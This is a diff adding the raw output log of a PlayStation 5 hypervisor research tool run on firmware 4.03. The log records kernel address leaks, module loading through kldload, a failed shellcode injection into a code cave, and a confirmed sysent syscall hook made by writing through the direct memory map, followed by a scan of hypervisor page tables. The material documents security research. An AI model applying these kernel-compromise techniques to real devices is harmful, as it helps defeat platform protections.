@@ -1,0 +1,3382 @@
+
+==============================================
+  PS5 Hypervisor Research Tool
+  Target: FW 4.03 (educational/personal use)
+==============================================
+
+[*] FW version: 0x4030000
+[*] Kernel data base: 0xffffffff91960000
+[*] Kernel text base: 0xffffffff90d60000
+[+] FW 4.xx detected
+[*] pm_pml4 = 0xffff813318df2000
+[+] DMAP base discovered: 0xffff813300000000 (cr3_offset=0x28, cr3=0x18df2000)
+
+=============================================
+  Campaign 5: Kernel/HV Reconnaissance
+=============================================
+
+[*] KERNEL_ADDRESS_TEXT_BASE  = 0xffffffff90d60000
+[*] KERNEL_ADDRESS_DATA_BASE = 0xffffffff91960000
+[*] KERNEL_ADDRESS_ALLPROC   = 0xffffffff9414dcb8
+[*] DMAP base                = 0xffff813300000000
+
+[*] Security flags: 1700000000000001028200120c000000
+[*] QA flags: ffff0301abcdef420879ff90ffffffff
+[*] is_development_mode check: reading from security_flags...
+
+[*] Checking kldload availability...
+    FW < 6.50 should have GMET disabled, making kldload viable.
+    [+] FW 0x4030000 - GMET likely NOT enforced, kldload should work!
+
+=============================================
+  Campaign 7: Kernel Module (kldload)
+=============================================
+
+[*] Kernel module (.ko) size: 12248 bytes
+
+[*] Step 1: Allocating shared result buffer...
+[+] Result buffer: userland VA=0x20003c000
+    Direct memory PA: 0x2000304000 (PS5 bus address)
+    CPU physical PA:  0x452504000 (from page table walk)
+    DMAP kernel VA:   0xffff813752504000
+[*] DMAP verify: wrote 0xbeefcafe12345678, read back 0xbeefcafe12345678 [OK]
+[+] ELF sym g_output_kva: section=4, file_offset=0x380, current=0xdead000000000000
+[+] Patched g_output_kva -> 0xffff813752504000
+[+] Wrote patched hv_kmod.ko (12248 bytes)
+
+[*] Step 3: Loading kernel module via kldload...
+[+] kldload returned kid=78
+[*] kldstat returned 78 (address=0x0) — will scan for module.
+
+[*] Step 4: Reading results from shared buffer...
+    First 64 bytes of shared buffer:
+      00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+      00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+      00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+      00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+      
+
+[*] Step 4a: Buffer empty — polling for deferred SYSINIT...
+    SYSINIT did not fire within 2s — continuing with scanner.
+
+[*] Step 4b: SYSINIT/MOD_LOAD did not fire — scanner + IDT invocation...
+[*] g_kdata_base=0xffffffff91960000  g_ktext_base=0xffffffff90d60000  g_dmap_base=0xffff813300000000
+[*] XOM test: ktext PA=0x10d60000, DMAP read FAIL, bytes: 
+[*] Scan 1/3 (kdata→top): 0xffffffff91960000 → 0xffffffffffe00000 (1764MB)
+    ...100 chunks, 100 mapped, 34756 pages, 0 mmio-skipped (VA=0xffffffff9e000000)    ...200 chunks, 166 mapped, 34756 pages, 0 mmio-skipped (VA=0xffffffffaa800000)    ...300 chunks, 166 mapped, 34756 pages, 0 mmio-skipped (VA=0xffffffffb7000000)    2MB chunks: 372 checked, 166 mapped; pages: 34756 mapped (mmio-skipped: 0)
+[*] Scan 2/3 (DMAP→ktext gap): 0xffffffff50d60000 → 0xffffffff90d60000 (1024MB)
+    ...400 chunks, 167 mapped, 35268 pages, 0 mmio-skipped (VA=0xffffffff83800000)    ...500 chunks, 167 mapped, 35268 pages, 0 mmio-skipped (VA=0xffffffff90000000)    2MB chunks: 507 checked, 168 mapped; pages: 35620 mapped (mmio-skipped: 0)
+[*] Scan 3/3 (below DMAP): 0xffff8132c0000000 → 0xffff813300000000 (1024MB)
+    2MB chunks: 507 checked, 168 mapped; pages: 35620 mapped (mmio-skipped: 0)
+[*] Full-page scan: searching for trampoline at any page offset...
+    Full-page scan: 34756 pages checked
+[*] Trampoline not at page start — trying sentinel scan...
+[*] Searching for sentinel 0xffff813752504000
+    ...sentinel: 100 chunks (VA=0xffffffff9de00000)    ...sentinel: 200 chunks (VA=0xffffffffaa600000)    ...sentinel: 300 chunks (VA=0xffffffffb6e00000)    ...sentinel: 400 chunks (VA=0xffffffff83600000)    ...sentinel: 500 chunks (VA=0xffffffff8fe00000)[*] Scan done: 507 2MB chunks (168 mapped), 35620 pages mapped
+[-] Trampoline not found in any scan range.
+
+[*] Step 4c: Direct shellcode injection into ktext code cave...
+[+] Shellcode built: 421 bytes
+[*] Scanning ktext for code cave (need 421 bytes of 0xCC)...
+[-] No suitable code cave found (best run: 0, need 421).
+    Trying kdata region for code cave...
+[+] Code cave in kdata: KVA=0xffffffff91961000 PA=0x11961000 (4096 bytes)
+[!] Code cave is in kdata (0xffffffff91961000), NOT ktext.
+    NPT enforces NX on kdata pages — execution would crash.
+    ktext is XOM (read/write blocked) — can't inject there either.
+    W^X enforcement prevents direct shellcode injection.
+
+[*] Step 4d: Falling back to ring-3 diagnostics...
+[*] sysarch(GET_FSBASE): ret=0, value=0x8ff800080
+[*] sysarch(GET_GSBASE): ret=0, value=0x0
+[*] Known from exploit:
+    ktext_base  = 0xffffffff90d60000
+    kdata_base  = 0xffffffff91960000
+    dmap_base   = 0xffff813300000000
+    CR3 (phys)  = 0x18df2000
+[*] Searching kdata for IDT via DMAP (SIDT is HV-intercepted)...
+    IDT scan: 16MB/128MB (4096 pages OK, 0 fail)
+    IDT scan: 32MB/128MB (8192 pages OK, 0 fail)
+    IDT scan: 48MB/128MB (12288 pages OK, 0 fail)
+    IDT scan: 64MB/128MB (16384 pages OK, 0 fail)
+    IDT scan: 80MB/128MB (20480 pages OK, 0 fail)
+    IDT scan: 96MB/128MB (24576 pages OK, 0 fail)
+    (scanned 25806 pages, 0 unmapped, best gate run=7 at kdata+0x64cdc80)
+[+] IDT found at kdata+0x64cdc80 (KVA 0xffffffff97e2dc80), kernel CS=0x20
+    IDT[  0] #DE    = 0xffffffff90ff4258 (ktext+0x294258) sel=0x20
+    IDT[  1] #DB    = 0xffffffff90f907ad (ktext+0x2307ad) sel=0x20
+    IDT[  2] NMI    = 0xffffffff90f907b4 (ktext+0x2307b4) sel=0x20
+    IDT[  3] #BP    = 0xffffffff90ff4178 (ktext+0x294178) sel=0x20
+    IDT[  6] #UD    = 0xffffffff90ff44b0 (ktext+0x2944b0) sel=0x20
+    IDT[  8] #DF    = 0xffffffff90ff4180 (ktext+0x294180) sel=0x20
+    IDT[ 13] #GP    = 0xffffffff90f907ad (ktext+0x2307ad) sel=0x20
+    IDT[ 14] #PF    = 0xffffffff90ff40d0 (ktext+0x2940d0) sel=0x20
+    IDT[ 32] Timer  = 0xffffffff90ff4420 (ktext+0x294420) sel=0x20
+    IDT[128] int80  = 0xffffffff90ff4420 (ktext+0x294420) sel=0x20
+[*] Looking up sysent via known sysentvec offset...
+    sysentvec raw (24 bytes at PA 0x12671bb8):
+      d4 02 00 00 00 00 00 00 c0 09 ad 91 ff ff b7 de 00 00 00 00 00 00 00 00 
+    sv_size=724, sv_table_raw=0xdeb7ffff91ad09c0 → fixed=0xffffffff91ad09c0
+    offset+14 toggle=0xdeb7 (unpaused/etaHEN active)
+[+] Sysent table at KVA 0xffffffff91ad09c0 (kdata+0x1709c0), 724 entries
+[*] Key sysent entries (sy_narg, sy_call -> ktext offset):
+    [  0] nosys        narg=0  sy_call=0xffffffff90ff84d8 (ktext+0x2984d8)
+    [  1] exit         narg=1  sy_call=0xffffffff90ff7f98 (ktext+0x297f98)
+    [  2] fork         narg=0  sy_call=0xffffffff90ff8d18 (ktext+0x298d18)
+    [  3] read         narg=3  sy_call=0xffffffff90ff75d0 (ktext+0x2975d0)
+    [  4] write        narg=3  sy_call=0xffffffff90ff83f0 (ktext+0x2983f0)
+    [  5] open         narg=3  sy_call=0xffffffff90ff78a8 (ktext+0x2978a8)
+    [  6] close        narg=1  sy_call=0xffffffff90ff8080 (ktext+0x298080)
+    [ 20] getpid       narg=0  sy_call=0xffffffff90ff8178 (ktext+0x298178)
+    [ 37] kill         narg=2  sy_call=0xffffffff90ff7bd0 (ktext+0x297bd0)
+    [ 54] ioctl        narg=3  sy_call=0xffffffff90ff71f0 (ktext+0x2971f0)
+    [ 59] execve       narg=3  sy_call=0xffffffff90ff74a8 (ktext+0x2974a8)
+    [ 73] munmap       narg=2  sy_call=0xffffffff90ff7d20 (ktext+0x297d20)
+    [ 74] mprotect     narg=3  sy_call=0xffffffff90ff8c40 (ktext+0x298c40)
+    [165] sysarch      narg=2  sy_call=0xffffffff90ff8380 (ktext+0x298380)
+    [202] sysctl       narg=6  sy_call=0xffffffff90ff7c60 (ktext+0x297c60)
+    [304] kldload      narg=1  sy_call=0xffffffff90ff8a10 (ktext+0x298a10)
+    [305] kldunload    narg=1  sy_call=0xffffffff90ff7498 (ktext+0x297498)
+    [308] kldstat      narg=2  sy_call=0xffffffff90ff7380 (ktext+0x297380)
+    [477] mmap         narg=6  sy_call=0xffffffff90ff7a40 (ktext+0x297a40)
+    [337] kldsym       narg=3  sy_call=0xffffffff90ff7f08 (ktext+0x297f08)
+
+[*] Verifying sysent table...
+    narg cross-check: 12/12 matched
+    nosys consistency: 7/124 high entries point to nosys (0xffffffff90ff84d8)
+[+] Sysent table VERIFIED (12/12 narg match)!
+
+[*] Live sysent hook test: syscall 699
+    Original sy_call: 0xffffffff90ff84d8 (nosys=0xffffffff90ff84d8, match=YES)
+    Before: syscall(699) = 78, errno=0 (other)
+    getpid sy_call: 0xffffffff90ff8178
+    DMAP write verify: wrote 0xffffffff90ff8178, read back 0xffffffff90ff8178 [OK]
+    After:  syscall(699) = 78, errno=0 (real pid=93)
+[-] DMAP write verified but syscall behavior UNCHANGED.
+    ret before=78, after=78 (identical)
+    etaHEN syscall wrapper likely intercepts before sysent.
+[*] Investigating etaHEN dispatch path...
+    sysentvec[0..63]:
+      00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+      00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+      00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+      00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+      
+    sv_fixup (offset 48): 0x0
+[*] Safe reverse test: hook sysent[253] (issetugid) to getpid...
+    sysent[253] original: sy_call=0xffffffff90ff8ac0, narg=0
+    Before hook: issetugid()=0, errno=0
+    After write: sy_call=0xffffffff90ff8178 (OK)
+    After hook:  issetugid()=93, errno=0 (pid=93)
+    Restored sysent[253]
+[+] SYSENT HOOK CONFIRMED for standard syscalls!
+    Kernel dispatches real syscalls through sysent.
+    etaHEN only intercepts high/custom syscalls.
+    This means: hook any standard sysent entry
+    → execution redirected to chosen kernel function.
+    Restored sysent[699]
+
+=============================================
+  NPT Discovery: HV Page Table Scan
+=============================================
+
+[*] Search signatures:
+    ktext PA  = 0x10d60000 (2MB page: 0x10c00000)
+    kdata PA  = 0x11960000 (2MB page: 0x11800000)
+    Guest CR3 = 0x18df2000
+    Scan range: PA 0x0 → 0x20000000 (512MB)
+
+[!] PT page at PA 0x6a000: 512 present entries, 1 kdata refs, 1 ktext refs
+    [134] 0x0000000010c00087 → PA=0x10c00000 2MB RW User X
+    [140] 0x0000000011800087 → PA=0x11800000 2MB RW User X
+
+[!] PT page at PA 0x6e000: 512 present entries, 1 kdata refs, 1 ktext refs
+    [134] 0x0000000010c00083 → PA=0x10c00000 2MB RW Kern X
+    [140] 0x0000000011800083 → PA=0x11800000 2MB RW Kern X
+
+[!] PT page at PA 0x14f000: 197 present entries, 0 kdata refs, 1 ktext refs
+    [135] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x219000: 223 present entries, 1 kdata refs, 1 ktext refs
+    [216] 0x0000000011f71d01 → PA=0x11f71000 4KB RO Kern X
+
+[!] PT page at PA 0x247000: 155 present entries, 0 kdata refs, 2 ktext refs
+    [487] 0x1110000011111011 → PA=0x11111000 4KB RO Kern X
+    [503] 0x1110000011111011 → PA=0x11111000 4KB RO Kern X
+
+[!] PT page at PA 0x2a3000: 62 present entries, 0 kdata refs, 2 ktext refs
+    [483] 0x0000000011444415 → PA=0x11444000 4KB RO User X
+    [499] 0x0000000011444001 → PA=0x11444000 4KB RO Kern X
+
+[!] PT page at PA 0x2f7000: 90 present entries, 1 kdata refs, 1 ktext refs
+    [415] 0x0000000012909d65 → PA=0x12909000 4KB RO User X
+
+[!] PT page at PA 0x557000: 53 present entries, 0 kdata refs, 2 ktext refs
+    [486] 0x0000000011111111 → PA=0x11111000 4KB RO Kern X
+    [502] 0x0000000011111111 → PA=0x11111000 4KB RO Kern X
+
+[!] PT page at PA 0x57d000: 185 present entries, 0 kdata refs, 1 ktext refs
+    [ 50] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x5f4000: 141 present entries, 0 kdata refs, 4 ktext refs
+    [ 64] 0x0000000011193501 → PA=0x11193000 4KB RO Kern X
+    [256] 0x0000000011193501 → PA=0x11193000 4KB RO Kern X
+    [304] 0x0000000011193501 → PA=0x11193000 4KB RO Kern X
+    [322] 0x0000000011193501 → PA=0x11193000 4KB RO Kern X
+
+[!] PT page at PA 0x5f5000: 118 present entries, 0 kdata refs, 2 ktext refs
+    [125] 0x0000000011193501 → PA=0x11193000 4KB RO Kern X
+    [236] 0x0000000011193501 → PA=0x11193000 4KB RO Kern X
+
+[!] PT page at PA 0x5f6000: 149 present entries, 0 kdata refs, 3 ktext refs
+    [ 12] 0x0000000011193401 → PA=0x11193000 4KB RO Kern X
+    [105] 0x0000000011193501 → PA=0x11193000 4KB RO Kern X
+    [144] 0x0000000011192c01 → PA=0x11192000 4KB RO Kern X
+
+[!] PT page at PA 0x5f7000: 135 present entries, 0 kdata refs, 10 ktext refs
+    [ 67] 0x0000000011193501 → PA=0x11193000 4KB RO Kern X
+    [124] 0x0000000011192c01 → PA=0x11192000 4KB RO Kern X
+    [142] 0x0000000011193501 → PA=0x11193000 4KB RO Kern X
+    [154] 0x0000000011193501 → PA=0x11193000 4KB RO Kern X
+    [211] 0x0000000011192c01 → PA=0x11192000 4KB RO Kern X
+    [229] 0x0000000011193501 → PA=0x11193000 4KB RO Kern X
+    [298] 0x0000000011192c01 → PA=0x11192000 4KB RO Kern X
+    [316] 0x0000000011193501 → PA=0x11193000 4KB RO Kern X
+    [328] 0x0000000011193501 → PA=0x11193000 4KB RO Kern X
+    [415] 0x0000000011193501 → PA=0x11193000 4KB RO Kern X
+
+[!] PT page at PA 0x5f9000: 151 present entries, 1 kdata refs, 0 ktext refs
+    [349] 0x0000000013900101 → PA=0x13900000 4KB RO Kern X
+
+[!] PT page at PA 0x6f5000: 179 present entries, 0 kdata refs, 1 ktext refs
+    [243] 0x0000000010f71d01 → PA=0x10f71000 4KB RO Kern X
+
+[!] PT page at PA 0x764000: 176 present entries, 0 kdata refs, 1 ktext refs
+    [389] 0x0000000010f71d01 → PA=0x10f71000 4KB RO Kern X
+
+[!] PT page at PA 0x7d1000: 127 present entries, 1 kdata refs, 1 ktext refs
+    [257] 0x0000000011f18b01 → PA=0x11f18000 4KB RO Kern X
+
+[!] PT page at PA 0x841000: 148 present entries, 1 kdata refs, 0 ktext refs
+    [492] 0x0000000013000215 → PA=0x13000000 4KB RO User X
+
+[!] PT page at PA 0x8e3000: 168 present entries, 0 kdata refs, 2 ktext refs
+    [494] 0x0000000011110111 → PA=0x11110000 4KB RO Kern X
+    [510] 0x0000000011110111 → PA=0x11110000 4KB RO Kern X
+
+[!] PT page at PA 0x950000: 218 present entries, 0 kdata refs, 1 ktext refs
+    [386] 0x0000000010e78b07 → PA=0x10e78000 4KB RW User X
+
+[!] PT page at PA 0x984000: 224 present entries, 0 kdata refs, 1 ktext refs
+    [273] 0x0000000011900f09 → PA=0x11900000 4KB RO Kern X
+
+[!] PT page at PA 0xa06000: 207 present entries, 0 kdata refs, 1 ktext refs
+    [433] 0x0000000010f98801 → PA=0x10f98000 4KB RO Kern X
+
+[!] PT page at PA 0xa8c000: 193 present entries, 0 kdata refs, 1 ktext refs
+    [ 87] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xa8d000: 220 present entries, 0 kdata refs, 1 ktext refs
+    [ 11] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xb60000: 200 present entries, 1 kdata refs, 0 ktext refs
+    [440] 0x0000000013000211 → PA=0x13000000 4KB RO Kern X
+
+[!] PT page at PA 0xb6b000: 89 present entries, 0 kdata refs, 1 ktext refs
+    [497] 0x0000000011555401 → PA=0x11555000 4KB RO Kern X
+
+[!] PT page at PA 0xb6f000: 13 present entries, 0 kdata refs, 1 ktext refs
+    [482] 0x0040000011011541 → PA=0x11011000 4KB RO Kern X
+
+[!] PT page at PA 0xbaa000: 140 present entries, 1 kdata refs, 0 ktext refs
+    [381] 0x0a10000012fbe80f → PA=0x12fbe000 4KB RW User X
+
+[!] PT page at PA 0xc6c000: 198 present entries, 1 kdata refs, 0 ktext refs
+    [ 68] 0x000000001300021d → PA=0x13000000 4KB RO User X
+
+[!] PT page at PA 0xcb8000: 55 present entries, 0 kdata refs, 1 ktext refs
+    [216] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0xcba000: 63 present entries, 0 kdata refs, 1 ktext refs
+    [ 76] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0x12ab000: 23 present entries, 0 kdata refs, 1 ktext refs
+    [196] 0x00000000117a5e7f → PA=0x117a5000 4KB RW User X
+
+[!] PT page at PA 0x13dd000: 33 present entries, 1 kdata refs, 0 ktext refs
+    [383] 0x0000000013148a15 → PA=0x13148000 4KB RO User X
+
+[!] PT page at PA 0x1510000: 380 present entries, 0 kdata refs, 1 ktext refs
+    [ 91] 0x000000001170a125 → PA=0x1170a000 4KB RO User X
+
+[!] PT page at PA 0x1513000: 360 present entries, 0 kdata refs, 1 ktext refs
+    [ 88] 0x000000001110e96d → PA=0x1110e000 4KB RO User X
+
+[!] PT page at PA 0x1a3a000: 290 present entries, 0 kdata refs, 4 ktext refs
+    [209] 0x3a80000010c2c2ff → PA=0x10c2c000 2MB RW User X
+    [214] 0x3a80000010c4c4ff → PA=0x10c4c000 2MB RW User X
+    [229] 0x3a80000010c0c0ff → PA=0x10c0c000 2MB RW User X
+    [231] 0x3a80000010c6c6ff → PA=0x10c6c000 2MB RW User X
+
+[!] PT page at PA 0x1a84000: 219 present entries, 6 kdata refs, 0 ktext refs
+    [ 81] 0xec000000119303bd → PA=0x11930000 2MB RO User NX
+    [144] 0xec000000118b07b7 → PA=0x118b0000 2MB RW User NX
+    [207] 0xec00000011930bbd → PA=0x11930000 2MB RO User NX
+    [270] 0xec00000011830fb1 → PA=0x11830000 2MB RO Kern NX
+    [333] 0xec000000118b13b7 → PA=0x118b1000 2MB RW User NX
+    [459] 0xec000000118b1bb7 → PA=0x118b1000 2MB RW User NX
+
+[!] PT page at PA 0x1a85000: 218 present entries, 4 kdata refs, 0 ktext refs
+    [ 10] 0xec00000011931fbd → PA=0x11931000 2MB RO User NX
+    [199] 0xec00000011932bbd → PA=0x11932000 2MB RO User NX
+    [388] 0xec000000118337b1 → PA=0x11833000 2MB RO Kern NX
+    [451] 0xec00000011833bb1 → PA=0x11833000 2MB RO Kern NX
+
+[!] PT page at PA 0x1a86000: 221 present entries, 5 kdata refs, 0 ktext refs
+    [ 65] 0xec000000118b43b7 → PA=0x118b4000 2MB RW User NX
+    [128] 0xec000000119347bd → PA=0x11934000 2MB RO User NX
+    [254] 0xec00000011834fb1 → PA=0x11834000 2MB RO Kern NX
+    [443] 0xec000000118b5bb7 → PA=0x118b5000 2MB RW User NX
+    [506] 0xec00000011835fb1 → PA=0x11835000 2MB RO Kern NX
+
+[!] PT page at PA 0x1a87000: 220 present entries, 7 kdata refs, 0 ktext refs
+    [ 57] 0xec000000118363b1 → PA=0x11836000 2MB RO Kern NX
+    [183] 0xec00000011936bbd → PA=0x11936000 2MB RO User NX
+    [246] 0xec000000118b6fb7 → PA=0x118b6000 2MB RW User NX
+    [309] 0xec000000118b73b7 → PA=0x118b7000 2MB RW User NX
+    [372] 0xec000000118377b1 → PA=0x11837000 2MB RO Kern NX
+    [435] 0xec000000118b7bb7 → PA=0x118b7000 2MB RW User NX
+    [498] 0xec000000118b7fb7 → PA=0x118b7000 2MB RW User NX
+
+[!] PT page at PA 0x1a88000: 220 present entries, 4 kdata refs, 0 ktext refs
+    [ 49] 0xec000000118b83b7 → PA=0x118b8000 2MB RW User NX
+    [238] 0xec00000011938fbd → PA=0x11938000 2MB RO User NX
+    [301] 0xec000000119393bd → PA=0x11939000 2MB RO User NX
+    [364] 0xec000000119397bd → PA=0x11939000 2MB RO User NX
+
+[!] PT page at PA 0x1a89000: 221 present entries, 3 kdata refs, 0 ktext refs
+    [ 41] 0xec0000001193a3bd → PA=0x1193a000 2MB RO User NX
+    [293] 0xec000000118bb3b7 → PA=0x118bb000 2MB RW User NX
+    [356] 0xec0000001193b7bd → PA=0x1193b000 2MB RO User NX
+
+[!] PT page at PA 0x1a8a000: 221 present entries, 3 kdata refs, 0 ktext refs
+    [159] 0xec0000001183cbb1 → PA=0x1183c000 2MB RO Kern NX
+    [348] 0xec0000001193d7bd → PA=0x1193d000 2MB RO User NX
+    [474] 0xec0000001193dfbd → PA=0x1193d000 2MB RO User NX
+
+[!] PT page at PA 0x1a8b000: 204 present entries, 6 kdata refs, 0 ktext refs
+    [ 88] 0xec0000001183e7b1 → PA=0x1183e000 2MB RO Kern NX
+    [151] 0xec0000001193ebbd → PA=0x1193e000 2MB RO User NX
+    [277] 0xec0000001183f3b1 → PA=0x1183f000 2MB RO Kern NX
+    [340] 0xec0000001193f7bd → PA=0x1193f000 2MB RO User NX
+    [403] 0xec0000001193fbbd → PA=0x1193f000 2MB RO User NX
+    [466] 0xec0000001183ffb1 → PA=0x1183f000 2MB RO Kern NX
+
+[!] PT page at PA 0x1bd8000: 92 present entries, 0 kdata refs, 10 ktext refs
+    [210] 0x0000000011800073 → PA=0x11800000 4KB RW Kern X
+    [214] 0x0000000011800079 → PA=0x11800000 4KB RO Kern X
+    [216] 0x0000000011800065 → PA=0x11800000 4KB RO User X
+    [220] 0x0000000011800067 → PA=0x11800000 4KB RW User X
+    [226] 0x0000000011800069 → PA=0x11800000 4KB RO Kern X
+    [232] 0x000000001180006b → PA=0x11800000 4KB RW Kern X
+    [236] 0x000000001180006d → PA=0x11800000 4KB RO User X
+    [240] 0x000000001180006f → PA=0x11800000 4KB RW User X
+    [242] 0x0000000011800071 → PA=0x11800000 4KB RO Kern X
+    [250] 0x0000000011800077 → PA=0x11800000 4KB RW User X
+
+[!] PT page at PA 0x1bd9000: 121 present entries, 14 kdata refs, 14 ktext refs
+    [256] 0x0000000012000067 → PA=0x12000000 4KB RW User X
+    [258] 0x0000000012000069 → PA=0x12000000 4KB RO Kern X
+    [260] 0x0000000012000079 → PA=0x12000000 4KB RO Kern X
+    [270] 0x000000001200007f → PA=0x12000000 4KB RW User X
+    [272] 0x000000001200006b → PA=0x12000000 4KB RW Kern X
+    [276] 0x000000001200006d → PA=0x12000000 4KB RO User X
+    [280] 0x000000001200006f → PA=0x12000000 4KB RW User X
+    [284] 0x0000000012000065 → PA=0x12000000 4KB RO User X
+    [286] 0x000000001200007b → PA=0x12000000 4KB RW Kern X
+    [292] 0x0000000012000071 → PA=0x12000000 4KB RO Kern X
+    [300] 0x0000000012000073 → PA=0x12000000 4KB RW Kern X
+    [316] 0x000000001200007d → PA=0x12000000 4KB RO User X
+    [320] 0x0000000012000075 → PA=0x12000000 4KB RO User X
+    [324] 0x0000000012000077 → PA=0x12000000 4KB RW User X
+
+[!] PT page at PA 0x1bdf000: 191 present entries, 0 kdata refs, 1 ktext refs
+    [413] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x1bfc000: 190 present entries, 0 kdata refs, 1 ktext refs
+    [395] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x1bff000: 197 present entries, 0 kdata refs, 2 ktext refs
+    [304] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [389] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x1f04000: 206 present entries, 0 kdata refs, 1 ktext refs
+    [196] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x1fb4000: 203 present entries, 0 kdata refs, 2 ktext refs
+    [  5] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [ 57] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x1fdf000: 197 present entries, 0 kdata refs, 2 ktext refs
+    [203] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [266] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x1fed000: 205 present entries, 0 kdata refs, 1 ktext refs
+    [ 15] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x2621000: 271 present entries, 2 kdata refs, 2 ktext refs
+    [353] 0x4400000011e8fe63 → PA=0x11e8f000 4KB RW Kern X
+    [369] 0x4400000011e8fe63 → PA=0x11e8f000 4KB RW Kern X
+
+[!] PT page at PA 0x2685000: 240 present entries, 0 kdata refs, 1 ktext refs
+    [ 42] 0x4c00000010d845c7 → PA=0x10d84000 2MB RW User X
+
+[!] PT page at PA 0x26f9000: 172 present entries, 0 kdata refs, 1 ktext refs
+    [101] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x2700000: 70 present entries, 0 kdata refs, 1 ktext refs
+    [234] 0x00000000113d2f5d → PA=0x113d2000 4KB RO User X
+
+[!] PT page at PA 0x2701000: 73 present entries, 1 kdata refs, 1 ktext refs
+    [458] 0x0000000011db354b → PA=0x11db3000 4KB RW Kern X
+
+[!] PT page at PA 0x2707000: 81 present entries, 0 kdata refs, 1 ktext refs
+    [458] 0x00000000117a4645 → PA=0x117a4000 4KB RO User X
+
+[!] PT page at PA 0x274b000: 206 present entries, 0 kdata refs, 1 ktext refs
+    [308] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x2791000: 203 present entries, 0 kdata refs, 1 ktext refs
+    [ 49] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x27c5000: 219 present entries, 0 kdata refs, 1 ktext refs
+    [415] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x27c9000: 220 present entries, 0 kdata refs, 1 ktext refs
+    [165] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x27cb000: 194 present entries, 0 kdata refs, 1 ktext refs
+    [289] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x2908000: 51 present entries, 2 kdata refs, 2 ktext refs
+    [479] 0x0000000011a3c523 → PA=0x11a3c000 4KB RW Kern X
+    [487] 0x0000000011a3c523 → PA=0x11a3c000 4KB RW Kern X
+
+[!] PT page at PA 0x2992000: 187 present entries, 1 kdata refs, 1 ktext refs
+    [450] 0x0000000012037755 → PA=0x12037000 4KB RO User X
+
+[!] PT page at PA 0x2b5a000: 189 present entries, 0 kdata refs, 1 ktext refs
+    [193] 0x000000001122d315 → PA=0x1122d000 4KB RO User X
+
+[!] PT page at PA 0x2bff000: 253 present entries, 1 kdata refs, 1 ktext refs
+    [380] 0x000000001210ad29 → PA=0x1210a000 4KB RO Kern X
+
+[!] PT page at PA 0x2d4a000: 34 present entries, 1 kdata refs, 1 ktext refs
+    [312] 0x0000000012954d37 → PA=0x12954000 4KB RW User X
+
+[!] PT page at PA 0x2d5b000: 35 present entries, 1 kdata refs, 1 ktext refs
+    [165] 0x00000000129acd75 → PA=0x129ac000 4KB RO User X
+
+[!] PT page at PA 0x2e41000: 86 present entries, 1 kdata refs, 0 ktext refs
+    [163] 0x000000001370c145 → PA=0x1370c000 4KB RO User X
+
+[!] PT page at PA 0x2e56000: 209 present entries, 1 kdata refs, 1 ktext refs
+    [454] 0x0000000012009115 → PA=0x12009000 4KB RO User X
+
+[!] PT page at PA 0x2f46000: 39 present entries, 1 kdata refs, 0 ktext refs
+    [163] 0x000000001378c311 → PA=0x1378c000 4KB RO Kern X
+    Scan: 64MB/512MB (16384 OK, 0 blocked, 73 PT refs found)
+
+[!] PT page at PA 0x4431000: 191 present entries, 0 kdata refs, 1 ktext refs
+    [134] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x4491000: 261 present entries, 1 kdata refs, 1 ktext refs
+    [499] 0x4400000011e8fe63 → PA=0x11e8f000 4KB RW Kern X
+
+[!] PT page at PA 0x44b1000: 200 present entries, 0 kdata refs, 1 ktext refs
+    [390] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x44d3000: 246 present entries, 0 kdata refs, 1 ktext refs
+    [136] 0x8900000010c045c7 → PA=0x10c04000 2MB RW User NX
+
+[!] PT page at PA 0x450e000: 80 present entries, 0 kdata refs, 1 ktext refs
+    [490] 0x000000001193310f → PA=0x11933000 4KB RW User X
+
+[!] PT page at PA 0x4519000: 176 present entries, 0 kdata refs, 1 ktext refs
+    [278] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x451a000: 205 present entries, 0 kdata refs, 1 ktext refs
+    [471] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x4521000: 185 present entries, 0 kdata refs, 1 ktext refs
+    [452] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x4523000: 183 present entries, 0 kdata refs, 1 ktext refs
